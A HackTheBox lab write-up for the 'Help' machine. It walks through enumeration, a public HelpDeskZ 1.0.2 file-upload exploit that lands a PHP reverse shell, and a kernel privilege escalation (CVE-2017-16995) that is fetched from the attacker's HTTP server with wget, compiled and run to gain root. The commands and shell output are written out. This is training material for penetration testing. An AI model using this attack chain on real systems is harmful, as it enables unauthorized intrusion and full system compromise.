# Help (Linux)

# nmap 
22
80
3000

IP turns into help.htb --> added this into **/etc/hosts**.

Port 3000 had a message display; 	
message	"Hi Shiv, To get access please find the credentials with given query"

http only shows the default Ubuntu Apache page.

# ffuf
support 301
javascript 301

## /support 
Takes into a HelpDeskZ dashbaord where we habe a login, search bar, submit a ticket etc..

Tried to do some command injections in the parameter and **Knowledgebase** section of the dashboard but no luck. 

### helpdeskz exploit
searchsploit helpdeskz
----------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                         |  Path
----------------------------------------------------------------------------------------------------------------------- ---------------------------------
HelpDeskZ 1.0.2 - Arbitrary File Upload                                                                                | php/webapps/40300.py
HelpDeskZ < 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download                                         | php/webapps/41200.py

To look for the version number I checked if there was a **README.md** directory on this webpage since it is mosty likely open source.
And we found this; Version: 1.0.2 from 1st June 2015

On ExploitDB I was able to read the code for 40300.py exploit. 

This tells me that the uploaded file's new name is just an MD5 hash of its original filename and the current time, plus its extension:

```php
$filename = md5($_FILES['attachment']['name'].time()) . '.' . $ext;
```

That helps me realize two things:

1. The extension is preserved — so if I upload a `.php` file, it stays a `.php` file.
2. I can predict or brute-force the hash if I know the filename and can guess the time, meaning I can find the uploaded file’s name and access it on the server.

That's how I get shell access without auth.

Also how to run it; Call this script with the base url of your HelpdeskZ-Installation and the name of the file you uploaded

exploit.py httplocalhosthelpdeskz phpshell.php

I created a reverse-shell.php file within my **/tmp** directory. 

`searchsploit -m php/webapps/40300.py`
This command copies the exploit script for **ExploitDB ID 40300** (a PHP web app exploit) to my current directory using **SearchSploit**. The `-m` flag means "mirror" (copy) the file.

### feroxbuster 
I figured wwhen I first ran the exploit that I did not have the correct directory the file would be uploaded to.
Since earlier when I tried to upload a **test** file it did not show me where it go uploaded. I could go and look at the open source code. But I decided to use feroxbuster

`eroxbuster -u http://10.10.10.245/support/`:
301      GET        9l       28w      322c http://help.htb/support/uploads/tickets => http://help.htb/support/uploads/tickets/

# Exploit 
After a couple of tries of getting nothing running the exploit; `python2 40300.py http://help.htb/support/uploads/tickets/ rvshell.php`
TL;DR:

You can tell it's written for Python 2 because:

    It uses print as a statement (without parentheses).

    If you try to run this in Python 3, it will throw a SyntaxError immediately on the first print line.


I realized a missed an important step that is on the exploit code:
Steps to reproduce:

http://localhost/helpdeskz/?v=submit_ticket&action=displayForm

Enter anything in the mandatory fields, attach your phpshell.php, solve the captcha and submit your ticket.

Call this script with the base url of your HelpdeskZ-Installation and the name of the file you uploaded:

exploit.py http://localhost/helpdeskz/ phpshell.php

Once doing these steps with **netcat** listener with the port number I had on my **reverse-shell.php** file. I was able to get a shell. 
```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
help@help:/$ ls
ls
bin   etc         initrd.img.old  lost+found  opt   run   sys  var
boot  home        lib             media       proc  sbin  tmp  vmlinuz
dev   initrd.img  lib64           mnt         root  srv   usr  vmlinuz.old
help@help:/$ cd home
cd home
help@help:/home$ ls
ls
help
help@help:/home$ cd help
cd help
help@help:/home/help$ ls
ls
help  npm-debug.log  user.txt
help@help:/home/help$ cat user.txt
cat user.txt
```
After some digging I used `uname -a` and returned; Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux

Using searchsploit again I found this exploit. 
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                 | linux/local/44298.c

To get the file to my target's machine I first made sure I downloaded the exploit in my machine;
searchsploit -m linux/local/44298.c
  Exploit: Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/44298
     Path: /usr/share/exploitdb/exploits/linux/local/44298.c
    Codes: CVE-2017-16995
 Verified: False
File Type: C source, ASCII text
Copied to: /tmp/help/44298.c


From here I started a http server;
python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.10.10.121 - - [06/Apr/2025 22:11:28] "GET /44298.c HTTP/1.1" 200 -

Back in the targets machine I used;
`help@help:/home/help$ wget http://10.10.14.11:8888/44298.c`

Then:

```bash 
help@help:/home/help$ gcc 44298.c -o x
gcc 44298.c -o x
help@help:/home/help$ chmod +x x
chmod +x x
help@help:/home/help$ ./x
./x
task_struct = ffff88001df98e00
uidptr = ffff88003d120b44
spawning root shell
root@help:/home/help# whoami
whoami
root
root@help:/home/help# ls
ls
44298.c  help  npm-debug.log  user.txt  x
root@help:/home/help# cd /root
cd /root
root@help:/root# cat root.txt
cat root.txt
```

# Summary – HTB: Help

This machine combined basic enumeration with real-world exploitation of a vulnerable help desk application and a classic local privilege escalation technique.

---

## Key Concepts & Takeaways

### Web Enumeration & Discovery
- Standard ports (22, 80) and a less common one (3000) were open.
- Virtual host (`help.htb`) was necessary for proper resolution — always try adding hostnames when things look incomplete.
- Content discovery tools like `ffuf` and `feroxbuster` revealed critical hidden paths: the `/support` endpoint exposed a HelpDeskZ instance and `/support/uploads/tickets/` pointed to where files were stored.

### Exploiting HelpDeskZ
- Identified the version via a readable file (README.md) — always check for metadata or documentation when working with open-source platforms.
- Used a public exploit (40300.py) to abuse unauthenticated file uploads.
- The application preserved the file extension and generated predictable filenames using an MD5 hash of the original filename and a timestamp — this allowed for successful RCE by uploading a `.php` reverse shell.
- Successful exploitation required using the correct submission workflow (submit ticket), confirming the upload directory, and triggering the payload manually.

### Privilege Escalation
- After gaining a foothold as a limited user, `uname -a` revealed a vulnerable kernel version.
- Used a known local privilege escalation exploit (44298.c) targeting Ubuntu 16.04.4's kernel.
- File was transferred using a simple Python HTTP server and compiled with `gcc` on the target.
- Execution of the binary granted a root shell.

---

## Things to Remember

- Web apps often leave version fingerprints behind — documentation, changelogs, or default file structures can expose useful info.
- When working with file upload vulnerabilities, examine how files are stored and named — hash functions and preserved extensions can open a path to exploitation.
- Always validate which interpreter (Python 2 vs 3) an exploit requires.
- For local privilege escalation, kernel versioning is crucial — pair it with SearchSploit or a CVE database to find known exploits.
- Quick file transfer between machines is essential — `python3 -m http.server` and `wget` is a go-to method in many environments.
- Tools like `ffuf`, `feroxbuster`, `Searchsploit`, and `nmap` are essential to streamline the discovery and exploitation phases.


